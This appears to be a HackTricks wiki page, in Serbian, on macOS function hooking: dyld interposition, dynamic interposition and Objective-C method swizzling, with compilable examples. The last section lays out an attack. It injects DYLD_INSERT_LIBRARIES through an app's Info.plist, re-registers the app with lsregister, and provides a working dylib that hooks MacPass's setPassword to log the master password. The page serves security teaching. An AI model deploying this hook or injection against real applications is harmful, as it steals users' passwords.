# macOS Function Hooking

{{#include ../../../banners/hacktricks-training.md}}

## Interpozicija funkcija

Kreirajte **dylib** sa **`__interpose` (`__DATA___interpose`)** sekcijom (ili sekcijom označenom sa **`S_INTERPOSING`**) koja sadrži parove **pokazivača na funkcije** koji se odnose na **originalne** i **zamenske** funkcije.

Zatim, **ubacite** dylib sa **`DYLD_INSERT_LIBRARIES`** (interpozicija treba da se desi pre nego što se glavna aplikacija učita). Očigledno, [**ograničenja** koja se primenjuju na korišćenje **`DYLD_INSERT_LIBRARIES`** važe i ovde](macos-library-injection/#check-restrictions).

### Interpozicija printf

{{#tabs}}
{{#tab name="interpose.c"}}
```c:interpose.c" overflow="wrap
// gcc -dynamiclib interpose.c -o interpose.dylib
#include <stdio.h>
#include <stdarg.h>

int my_printf(const char *format, ...) {
//va_list args;
//va_start(args, format);
//int ret = vprintf(format, args);
//va_end(args);

int ret = printf("Hello from interpose\n");
return ret;
}

__attribute__((used)) static struct { const void *replacement; const void *replacee; } _interpose_printf
__attribute__ ((section ("__DATA,__interpose"))) = { (const void *)(unsigned long)&my_printf, (const void *)(unsigned long)&printf };
```
{{#endtab}}

{{#tab name="hello.c"}}
```c
//gcc hello.c -o hello
#include <stdio.h>

int main() {
printf("Hello World!\n");
return 0;
}
```
{{#endtab}}

{{#tab name="interpose2.c"}}
```c
// Just another way to define an interpose
// gcc -dynamiclib interpose2.c -o interpose2.dylib

#include <stdio.h>

#define DYLD_INTERPOSE(_replacement, _replacee) \
__attribute__((used)) static struct { \
const void* replacement; \
const void* replacee; \
} _interpose_##_replacee __attribute__ ((section("__DATA, __interpose"))) = { \
(const void*) (unsigned long) &_replacement, \
(const void*) (unsigned long) &_replacee \
};

int my_printf(const char *format, ...)
{
int ret = printf("Hello from interpose\n");
return ret;
}

DYLD_INTERPOSE(my_printf,printf);
```
{{#endtab}}
{{#endtabs}}
```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./hello
Hello from interpose

DYLD_INSERT_LIBRARIES=./interpose2.dylib ./hello
Hello from interpose
```
> [!WARNING]
> **`DYLD_PRINT_INTERPOSTING`** env varijabla se može koristiti za debagovanje interpozicije i održaće proces interpozicije.

Takođe, imajte na umu da **interpozicija se dešava između procesa i učitanih biblioteka**, ne funkcioniše sa kešom deljenih biblioteka.

### Dinamička Interpozicija

Sada je takođe moguće dinamički interponovati funkciju koristeći funkciju **`dyld_dynamic_interpose`**. Ovo omogućava programatsku interpoziciju funkcije u vreme izvođenja umesto da se to radi samo na početku.

Potrebno je samo naznačiti **tuple** funkcije koju treba zameniti i funkciju zamene.
```c
struct dyld_interpose_tuple {
const void* replacement;
const void* replacee;
};
extern void dyld_dynamic_interpose(const struct mach_header* mh,
const struct dyld_interpose_tuple array[], size_t count);
```
## Method Swizzling

U ObjectiveC, ovako se poziva metoda: **`[myClassInstance nameOfTheMethodFirstParam:param1 secondParam:param2]`**

Potrebni su **objekat**, **metoda** i **parametri**. Kada se metoda pozove, **msg se šalje** koristeći funkciju **`objc_msgSend`**: `int i = ((int (*)(id, SEL, NSString *, NSString *))objc_msgSend)(someObject, @selector(method1p1:p2:), value1, value2);`

Objekat je **`someObject`**, metoda je **`@selector(method1p1:p2:)`** i argumenti su **value1**, **value2**.

Prateći strukture objekata, moguće je doći do **niza metoda** gde su **imena** i **pokazivači** na kod metoda **locirani**.

> [!CAUTION]
> Imajte na umu da se metode i klase pristupaju na osnovu njihovih imena, tako da se ove informacije čuvaju u binarnom formatu, pa ih je moguće preuzeti sa `otool -ov </path/bin>` ili [`class-dump </path/bin>`](https://github.com/nygard/class-dump)

### Accessing the raw methods

Moguće je pristupiti informacijama o metodama kao što su ime, broj parametara ili adresa kao u sledećem primeru:
```objectivec
// gcc -framework Foundation test.m -o test

#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

int main() {
// Get class of the variable
NSString* str = @"This is an example";
Class strClass = [str class];
NSLog(@"str's Class name: %s", class_getName(strClass));

// Get parent class of a class
Class strSuper = class_getSuperclass(strClass);
NSLog(@"Superclass name: %@",NSStringFromClass(strSuper));

// Get information about a method
SEL sel = @selector(length);
NSLog(@"Selector name: %@", NSStringFromSelector(sel));
Method m = class_getInstanceMethod(strClass,sel);
NSLog(@"Number of arguments: %d", method_getNumberOfArguments(m));
NSLog(@"Implementation address: 0x%lx", (unsigned long)method_getImplementation(m));

// Iterate through the class hierarchy
NSLog(@"Listing methods:");
Class currentClass = strClass;
while (currentClass != NULL) {
unsigned int inheritedMethodCount = 0;
Method* inheritedMethods = class_copyMethodList(currentClass, &inheritedMethodCount);

NSLog(@"Number of inherited methods in %s: %u", class_getName(currentClass), inheritedMethodCount);

for (unsigned int i = 0; i < inheritedMethodCount; i++) {
Method method = inheritedMethods[i];
SEL selector = method_getName(method);
const char* methodName = sel_getName(selector);
unsigned long address = (unsigned long)method_getImplementation(m);
NSLog(@"Inherited method name: %s (0x%lx)", methodName, address);
}

// Free the memory allocated by class_copyMethodList
free(inheritedMethods);
currentClass = class_getSuperclass(currentClass);
}

// Other ways to call uppercaseString method
if([str respondsToSelector:@selector(uppercaseString)]) {
NSString *uppercaseString = [str performSelector:@selector(uppercaseString)];
NSLog(@"Uppercase string: %@", uppercaseString);
}

// Using objc_msgSend directly
NSString *uppercaseString2 = ((NSString *(*)(id, SEL))objc_msgSend)(str, @selector(uppercaseString));
NSLog(@"Uppercase string: %@", uppercaseString2);

// Calling the address directly
IMP imp = method_getImplementation(class_getInstanceMethod(strClass, @selector(uppercaseString))); // Get the function address
NSString *(*callImp)(id,SEL) = (typeof(callImp))imp; // Generates a function capable to method from imp
NSString *uppercaseString3 = callImp(str,@selector(uppercaseString)); // Call the method
NSLog(@"Uppercase string: %@", uppercaseString3);

return 0;
}
```
### Method Swizzling sa method_exchangeImplementations

Funkcija **`method_exchangeImplementations`** omogućava da se **promeni** **adresa** **implementacije** **jedne funkcije za drugu**.

> [!CAUTION]
> Tako da kada se funkcija pozove, ono što se **izvršava je druga**.
```objectivec
//gcc -framework Foundation swizzle_str.m -o swizzle_str

#import <Foundation/Foundation.h>
#import <objc/runtime.h>


// Create a new category for NSString with the method to execute
@interface NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original method
return [self swizzledSubstringFromIndex:from];
}

@end

int main(int argc, const char * argv[]) {
// Perform method swizzling
Method originalMethod = class_getInstanceMethod([NSString class], @selector(substringFromIndex:));
Method swizzledMethod = class_getInstanceMethod([NSString class], @selector(swizzledSubstringFromIndex:));
method_exchangeImplementations(originalMethod, swizzledMethod);

// We changed the address of one method for the other
// Now when the method substringFromIndex is called, what is really called is swizzledSubstringFromIndex
// And when swizzledSubstringFromIndex is called, substringFromIndex is really colled

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

return 0;
}
```
> [!WARNING]
> U ovom slučaju, ako **implementacioni kod legit** metode **proverava** **ime** **metode**, mogao bi da **otkrije** ovo swizzling i spreči njegovo izvršavanje.
>
> Sledeća tehnika nema ovo ograničenje.

### Method Swizzling with method_setImplementation

Prethodni format je čudan jer menjate implementaciju 2 metode jednu iz druge. Koristeći funkciju **`method_setImplementation`**, možete **promeniti** **implementaciju** **metode za drugu**.

Samo zapamtite da **sačuvate adresu implementacije originalne** metode ako planirate da je pozovete iz nove implementacije pre nego što je prepišete, jer će kasnije biti mnogo komplikovanije locirati tu adresu.
```objectivec
#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

static IMP original_substringFromIndex = NULL;

@interface NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original implementation using objc_msgSendSuper
return ((NSString *(*)(id, SEL, NSUInteger))original_substringFromIndex)(self, _cmd, from);
}

@end

int main(int argc, const char * argv[]) {
@autoreleasepool {
// Get the class of the target method
Class stringClass = [NSString class];

// Get the swizzled and original methods
Method originalMethod = class_getInstanceMethod(stringClass, @selector(substringFromIndex:));

// Get the function pointer to the swizzled method's implementation
IMP swizzledIMP = method_getImplementation(class_getInstanceMethod(stringClass, @selector(swizzledSubstringFromIndex:)));

// Swap the implementations
// It return the now overwritten implementation of the original method to store it
original_substringFromIndex = method_setImplementation(originalMethod, swizzledIMP);

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

// Set the original implementation back
method_setImplementation(originalMethod, original_substringFromIndex);

return 0;
}
}
```
## Metodologija napada putem hook-ovanja

Na ovoj stranici su razmatrani različiti načini hook-ovanja funkcija. Međutim, oni su uključivali **izvršavanje koda unutar procesa za napad**.

Da bi se to postiglo, najlakša tehnika koja se može koristiti je injekcija [Dyld putem promenljivih okruženja ili otmice](macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md). Međutim, pretpostavljam da se to može uraditi i putem [Dylib injekcije procesa](macos-ipc-inter-process-communication/#dylib-process-injection-via-task-port).

Međutim, obe opcije su **ograničene** na **nezaštićene** binarne datoteke/procese. Proverite svaku tehniku da biste saznali više o ograničenjima.

Međutim, napad putem hook-ovanja funkcija je veoma specifičan, napadač će to uraditi da bi **ukrao osetljive informacije iz procesa** (inače biste jednostavno uradili napad injekcijom procesa). A te osetljive informacije mogu biti smeštene u aplikacijama preuzetim od strane korisnika, kao što je MacPass.

Dakle, vektor napadača bi bio da pronađe ranjivost ili ukloni potpis aplikacije, injektira **`DYLD_INSERT_LIBRARIES`** env promenljivu kroz Info.plist aplikacije dodajući nešto poput:
```xml
<key>LSEnvironment</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/Applications/Application.app/Contents/malicious.dylib</string>
</dict>
```
i zatim **ponovo registrujte** aplikaciju:
```bash
/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -f /Applications/Application.app
```
Dodajte u tu biblioteku kod za hook-ovanje za eksfiltraciju informacija: Lozinke, poruke...

> [!CAUTION]
> Imajte na umu da u novijim verzijama macOS-a, ako **uklonite potpis** aplikacionog binarnog fajla i je prethodno izvršen, macOS **neće više izvršavati aplikaciju**.

#### Primer biblioteke
```objectivec
// gcc -dynamiclib -framework Foundation sniff.m -o sniff.dylib

// If you added env vars in the Info.plist don't forget to call lsregister as explained before

// Listen to the logs with something like:
// log stream --style syslog --predicate 'eventMessage CONTAINS[c] "Password"'

#include <Foundation/Foundation.h>
#import <objc/runtime.h>

// Here will be stored the real method (setPassword in this case) address
static IMP real_setPassword = NULL;

static BOOL custom_setPassword(id self, SEL _cmd, NSString* password, NSURL* keyFileURL)
{
// Function that will log the password and call the original setPassword(pass, file_path) method
NSLog(@"[+] Password is: %@", password);

// After logging the password call the original method so nothing breaks.
return ((BOOL (*)(id,SEL,NSString*, NSURL*))real_setPassword)(self, _cmd,  password, keyFileURL);
}

// Library constructor to execute
__attribute__((constructor))
static void customConstructor(int argc, const char **argv) {
// Get the real method address to not lose it
Class classMPDocument = NSClassFromString(@"MPDocument");
Method real_Method = class_getInstanceMethod(classMPDocument, @selector(setPassword:keyFileURL:));

// Make the original method setPassword call the fake implementation one
IMP fake_IMP = (IMP)custom_setPassword;
real_setPassword = method_setImplementation(real_Method, fake_IMP);
}
```
## Reference

- [https://nshipster.com/method-swizzling/](https://nshipster.com/method-swizzling/)

{{#include ../../../banners/hacktricks-training.md}}
